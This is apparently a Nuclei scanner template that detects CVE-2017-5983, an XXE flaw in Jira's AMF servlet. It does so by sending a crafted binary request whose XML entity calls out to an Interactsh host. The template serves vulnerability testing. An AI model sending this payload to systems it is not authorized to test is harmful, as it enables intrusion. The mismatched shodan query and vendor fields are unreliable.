id: CVE-2017-5983

info:
  name: Jira AMF XXE / RCE
  author: us3r777, Synacktiv
  severity: Critical
  description: |
    This template triggers an XXE vulnerability on the endpoint /plugins/servlet/jwd/amf/ and captures the out-of-band request using Interactsh. Endpoints vulnerable to XXE should also be vulnerable to RCE via deserialization.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2017-5983
    - https://www.kb.cert.org/vuls/id/307983
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2017-5983
    cwe-id: CWE-502
    cpe: cpe:2.3:a:atlassian:jira:4.2.4:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: vendor
    product: jira
    shodan-query: 'http.title:"eclipse birt home"'
  tags: cve,cve2017,jira,amf,rce,xxe,intrusive,vuln

variables:
  version: "\x00\x00"
  header_count: "\x00\x00"
  message_count: "\x00\x01"
  target_uri: "test"
  target_uri_len: "\x00\x04"
  response_uri: "test"
  response_uri_len: "\x00\x04"
  xml_marker: "\x0f"
  xxe_payload: '<?xml version="1.0" ?> <!DOCTYPE message [ <!ENTITY % ext SYSTEM "http://{{interactsh-url}}/amf"> %ext; ]>'
  int: "0000"
  

http:
  - raw:
      - |
        POST /plugins/servlet/jwd/amf/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml
        Content-Length: {{len(xxe_payload)+29}}

        {{version}}{{header_count}}{{message_count}}{{target_uri_len}}{{target_uri}}{{response_uri_len}}{{response_uri}}{{url_decode(concat("%00%00%00%",dec_to_hex(len(concat(int,xml_marker,xxe_payload)))))}}{{xml_marker}}{{url_decode(concat("%00%00%00%",dec_to_hex(len(concat(xxe_payload)))))}}{{xxe_payload}}
    unsafe: true
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
